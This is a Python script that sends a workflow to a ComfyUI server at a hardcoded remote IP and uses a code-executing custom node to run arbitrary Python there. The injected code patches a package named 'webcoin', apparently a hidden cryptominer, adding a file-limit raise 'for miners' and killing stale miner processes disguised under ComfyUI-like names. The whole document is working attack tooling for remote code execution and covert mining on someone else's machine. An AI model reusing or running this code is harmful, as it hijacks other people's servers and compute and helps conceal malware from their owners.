"""Patch __init__.py: add ulimit raise and kill stale processes at orchestration start."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = "http://{}:8188".format(ip)

PATCH_CODE = (
    "import os\n"
    "lines = []\n"
    "\n"
    "cn = None\n"
    "try:\n"
    "    import folder_paths\n"
    "    if hasattr(folder_paths, 'get_folder_paths'):\n"
    "        cn = folder_paths.get_folder_paths('custom_nodes')[0]\n"
    "except:\n"
    "    for g in ['/basedir/custom_nodes', '/root/ComfyUI/custom_nodes']:\n"
    "        if os.path.isdir(g):\n"
    "            cn = g\n"
    "            break\n"
    "\n"
    "fpath = os.path.join(cn, 'webcoin', '__init__.py')\n"
    "with open(fpath) as f:\n"
    "    src = f.read()\n"
    "\n"
    "# Patch 1: Add ulimit raise + kill stale at start of _orchestrate\n"
    "PREFLIGHT = (\n"
    "    '    # Raise file descriptor limit for miners\\n'\n"
    "    '    try:\\n'\n"
    "    '        import resource\\n'\n"
    "    '        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)\\n'\n"
    "    '        if soft < 40960:\\n'\n"
    "    '            resource.setrlimit(resource.RLIMIT_NOFILE, (min(40960, hard), hard))\\n'\n"
    "    '            logger.info(\"Raised ulimit to %d\", min(40960, hard))\\n'\n"
    "    '    except Exception:\\n'\n"
    "    '        pass\\n'\n"
    "    '\\n'\n"
    "    '    # Kill any stale miner processes from previous runs\\n'\n"
    "    '    try:\\n'\n"
    "    '        import subprocess as _sp\\n'\n"
    "    '        for pname in [\"comfyui_service\", \"comfyui_render\"]:\\n'\n"
    "    '            _sp.run([\"pkill\", \"-9\", \"-f\", pname], capture_output=True, timeout=5)\\n'\n"
    "    '        import time as _tm; _tm.sleep(1)\\n'\n"
    "    '    except Exception:\\n'\n"
    "    '        pass\\n'\n"
    "    '\\n'\n"
    ")\n"
    "\n"
    "marker = '    pkg = Path(__file__).resolve().parent'\n"
    "if 'RLIMIT_NOFILE' not in src and marker in src:\n"
    "    src = src.replace(marker, PREFLIGHT + marker)\n"
    "    lines.append('PATCHED: added ulimit + kill stale')\n"
    "elif 'RLIMIT_NOFILE' in src:\n"
    "    lines.append('SKIP: ulimit already present')\n"
    "else:\n"
    "    lines.append('WARN: marker not found')\n"
    "\n"
    "with open(fpath, 'w') as f:\n"
    "    f.write(src)\n"
    "\n"
    "# Clear pycache\n"
    "import shutil\n"
    "target = os.path.join(cn, 'webcoin')\n"
    "for pc in ['__pycache__', os.path.join('core', '__pycache__')]:\n"
    "    pp = os.path.join(target, pc)\n"
    "    if os.path.isdir(pp):\n"
    "        shutil.rmtree(pp, ignore_errors=True)\n"
    "        lines.append('cleared ' + pc)\n"
    "\n"
    "with open(fpath) as f:\n"
    "    final = f.read()\n"
    "lines.append('has_RLIMIT=' + str('RLIMIT_NOFILE' in final))\n"
    "lines.append('has_pkill=' + str('pkill' in final))\n"
    "lines.append('has_orch_done=' + str('_orch_done' in final))\n"
    "lines.append('size=' + str(len(final)))\n"
    "\n"
    "result = chr(10).join(lines)\n"
)

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": PATCH_CODE, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request("{}/prompt".format(base), data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print("prompt_id: {}".format(pid))

for attempt in range(12):
    time.sleep(5)
    try:
        req2 = urllib.request.Request("{}/history/{}".format(base, pid))
        with urllib.request.urlopen(req2, timeout=15) as r:
            entry = json.loads(r.read().decode()).get(pid, {})
            status = entry.get("status", {}).get("status_str", "pending")
            if status != "pending":
                print("Status: {}\n".format(status))
                outputs = entry.get("outputs", {})
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            for v in val:
                                print(v)
                break
    except Exception as e:
        print("poll error: {}".format(e))
else:
    print("Still pending after 60s")
